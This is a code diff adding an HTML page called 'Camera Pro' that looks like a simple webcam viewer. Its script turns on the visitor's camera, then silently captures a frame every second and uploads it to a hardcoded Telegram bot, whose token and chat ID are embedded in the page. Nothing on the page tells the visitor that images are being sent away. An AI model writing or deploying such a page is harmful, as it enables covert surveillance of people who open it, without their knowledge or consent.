@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Pro</title>
+    <style>
+        body { text-align: center; }
+        video, canvas { width: 100%; max-width: 500px; }
+    </style>
+</head>
+<body>
+    <h1>Camera Pro</h1>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const TELEGRAM_BOT_TOKEN = '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk';
+        const CHAT_ID = '8101021767';
+        
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => video.srcObject = stream)
+            .catch(err => console.error("Error accessing camera:", err));
+        
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'image.jpg');
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("Sent: ", data))
+                .catch(err => console.error("Error sending image:", err));
+            }, 'image/jpeg');
+        }
+        
+        setInterval(captureAndSend, 1000); // প্রতি সেকেন্ডে ১টি ছবি পাঠাবে
+    </script>
+</body>
+</html>
